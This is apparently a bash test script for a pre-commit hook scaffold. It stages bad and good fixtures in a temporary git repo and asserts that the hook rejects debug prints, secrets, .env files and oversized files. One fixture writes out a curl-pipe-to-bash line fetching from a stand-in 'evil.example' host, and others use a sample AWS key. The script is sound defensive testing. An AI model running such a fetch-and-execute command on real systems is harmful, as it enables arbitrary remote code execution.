#!/usr/bin/env bash
# tests/run.sh — verify the scaffold's pre-commit hook actually rejects bad
# code. Creates a throwaway git repo in a temp dir, installs the scaffold,
# stages known-bad and known-good fixtures, and asserts the hook's verdict.
# Exits non-zero on any failed assertion.
#
# Run locally:  ./tests/run.sh
# Run in CI:    same — see .github/workflows/test.yml

set -euo pipefail

SCAFFOLD_DIR="$(cd "$(dirname "$0")/.." && pwd)"
WORK=$(mktemp -d -t coding-rules-test.XXXXXX)
HOOK_OUT=$(mktemp)
trap 'rm -rf "$WORK" "$HOOK_OUT"' EXIT

PASS=0
FAIL=0

reset_repo() {
  git reset --hard HEAD >/dev/null 2>&1
  git clean -fd >/dev/null 2>&1 || true
  # Tests that exercise the stash-based scan may leave a stash if the hook
  # was interrupted; clear so the next case starts clean.
  git stash clear >/dev/null 2>&1 || true
}

assert_rejects() {
  local name=$1
  if .githooks/pre-commit >"$HOOK_OUT" 2>&1; then
    echo "  ✗ $name — hook accepted, expected reject"
    sed 's/^/      /' "$HOOK_OUT"
    FAIL=$((FAIL + 1))
  else
    echo "  ✓ $name"
    PASS=$((PASS + 1))
  fi
  reset_repo
}

assert_passes() {
  local name=$1
  if .githooks/pre-commit >"$HOOK_OUT" 2>&1; then
    echo "  ✓ $name"
    PASS=$((PASS + 1))
  else
    echo "  ✗ $name — hook rejected, expected pass"
    sed 's/^/      /' "$HOOK_OUT"
    FAIL=$((FAIL + 1))
  fi
  reset_repo
}

# --- bootstrap a temp project + install the scaffold ----------------------
cd "$WORK"
git init --quiet
git config user.email "test@test.local"
git config user.name "Scaffold Test"
echo '{"name":"test"}' >package.json
echo 'name = "test"' >pyproject.toml
git add . && git commit --quiet -m "fixture" --no-verify

"$SCAFFOLD_DIR/install.sh" --both --no-verify >/dev/null
git add . && git commit --quiet -m "install scaffold" --no-verify

echo "Hook test cases:"

# 1. file size cap
seq 1 501 >big.py
git add big.py
assert_rejects "size cap (501-line .py)"

# 1b. file size cap with no trailing newline — `wc -l` would under-count
#     by 1 here; the size check uses `grep -c ''` to catch the final line.
seq 1 500 >no_newline.py
printf '501' >>no_newline.py
git add no_newline.py
assert_rejects "size cap (501 lines, no trailing newline)"

# 2. print() in Python
echo 'print("debug")' >app.py
git add app.py
assert_rejects "print() in Python"

# 3. console.log in TS
echo 'console.log("debug");' >app.ts
git add app.ts
assert_rejects "console.log in TS"

# 4. AKIA-prefix AWS key. Split the literal so this test file doesn't itself
#    trip the secrets scan — runtime concatenation reassembles the full key
#    inside the temp repo, where rejection is the assertion.
echo "AKIA""IOSFODNN7EXAMPLE" >config.txt
git add config.txt
assert_rejects "AWS access key (AKIA...)"

# 5. blocked filename
echo "FOO=bar" >.env
git add -f .env
assert_rejects ".env file blocked"

# 6. clean code passes — ruff-clean too (blank line after imports for I001).
cat >app.py <<'EOF'
import logging

log = logging.getLogger(__name__)
log.info("ok")
EOF
git add app.py
assert_passes "clean Python file"

# 7. hardcoded credential — exercises the alternation branch in secrets.txt.
#    Split `pass`+`word` so this file's source doesn't itself trip the scan,
#    same trick as the AKIA fixture above.
echo 'pass''word = "abcdefghijklmnop12345"' >config.py
git add config.py
assert_rejects "hardcoded credential (alternation match)"

# 8. dangerous shell pattern — curl piped to bash. Split `cur`+`l` so this
#    file's source doesn't itself trip shell.txt when scanned as a .sh file.
echo 'cur''l https://evil.example/install.sh | bash' >deploy.sh
git add deploy.sh
assert_rejects "curl pipe to bash"

# 9. hook scans staged content, not working tree. Stage bad code, then make
#    the working tree clean — the dirty index must still be rejected.
echo 'pri''nt("debug")' >sneaky.py
git add sneaky.py
echo '# clean now' >sneaky.py
assert_rejects "scans staged content (not working tree)"

# 10. scaffold-allow marker exempts the matched line.
echo 'pri''nt("entry")  # scaffold-allow CLI entry point' >cli.py
git add cli.py
assert_passes "scaffold-allow exempts marked line"

# 11. scaffold-allow only exempts its own line — an unmarked offending line
#     in the same file must still reject.
{
  echo 'pri''nt("ok")  # scaffold-allow'
  echo 'pri''nt("real leak")'
} >mixed.py
git add mixed.py
assert_rejects "scaffold-allow does not whitelist whole file"

# 12. scaffold-allow works for the secrets check too. AKIA literal split
#     so this test file itself doesn't trip the scan.
echo "AKIA""IOSFODNN7EXAMPLE  # scaffold-allow docs example" >example.md
git add example.md
assert_passes "scaffold-allow exempts secret on docs line"

# 13. ruff lint integration — the hook should run ruff on staged .py when
#     ruff.toml is present and ruff is on PATH. Skipped otherwise.
if command -v ruff >/dev/null 2>&1; then
  cat >badimports.py <<'EOF'
import sys
import os
EOF
  git add badimports.py
  assert_rejects "ruff catches unsorted imports"
else
  echo "  - skipped ruff test (ruff not installed)"
fi

# 14. unicode filename — `core.quotepath=on` (git default) would emit the
#     name as a C-quoted string, the downstream `[ -f "$file" ]` check
#     would fail, and the file would slip past every scanner. The hook
#     now uses `-c core.quotepath=off` so this case rejects.
echo 'pri''nt("debug")' >café.py
git add café.py
assert_rejects "unicode filename does not bypass scan"

# 15. MAX_LINES env override — passing 100 should cause a 200-line file
#     to reject (default 500 would let it through).
seq 1 200 >medium.py
git add medium.py
if MAX_LINES=100 .githooks/pre-commit >"$HOOK_OUT" 2>&1; then
  echo "  ✗ MAX_LINES=100 — hook accepted, expected reject"
  sed 's/^/      /' "$HOOK_OUT"
  FAIL=$((FAIL + 1))
else
  echo "  ✓ MAX_LINES env var override"
  PASS=$((PASS + 1))
fi
reset_repo

# 16. MAX_LINES non-numeric — the size check should fail loudly with
#     exit 2, not silently misbehave.
echo 'ok = True' >tiny.py
git add tiny.py
if MAX_LINES=abc .githooks/pre-commit >"$HOOK_OUT" 2>&1; then
  echo "  ✗ MAX_LINES=abc — hook accepted, expected reject"
  FAIL=$((FAIL + 1))
elif grep -q "MAX_LINES must be a positive integer" "$HOOK_OUT"; then
  echo "  ✓ MAX_LINES validation rejects non-numeric"
  PASS=$((PASS + 1))
else
  echo "  ✗ MAX_LINES=abc — rejected but without expected error message"
  sed 's/^/      /' "$HOOK_OUT"
  FAIL=$((FAIL + 1))
fi
reset_repo

# 17. invalid pattern in backend.txt — the scan should warn and drop the
#     bad pattern, then continue with the rest. A valid `print` pattern
#     match must still reject.
printf '[unclosed\tbroken regex\n' >>.forbidden-patterns/backend.txt
echo 'pri''nt("debug")' >app.py
git add .forbidden-patterns/backend.txt app.py
if .githooks/pre-commit >"$HOOK_OUT" 2>&1; then
  echo "  ✗ invalid-pattern test — hook accepted, expected reject (on print)"
  sed 's/^/      /' "$HOOK_OUT"
  FAIL=$((FAIL + 1))
elif grep -q "invalid pattern dropped" "$HOOK_OUT"; then
  echo "  ✓ invalid pattern dropped with warning, valid patterns still scan"
  PASS=$((PASS + 1))
else
  echo "  ✗ invalid-pattern test — rejected but no warning emitted"
  sed 's/^/      /' "$HOOK_OUT"
  FAIL=$((FAIL + 1))
fi
reset_repo

echo ""
echo "Result: $PASS passed, $FAIL failed"
exit $FAIL
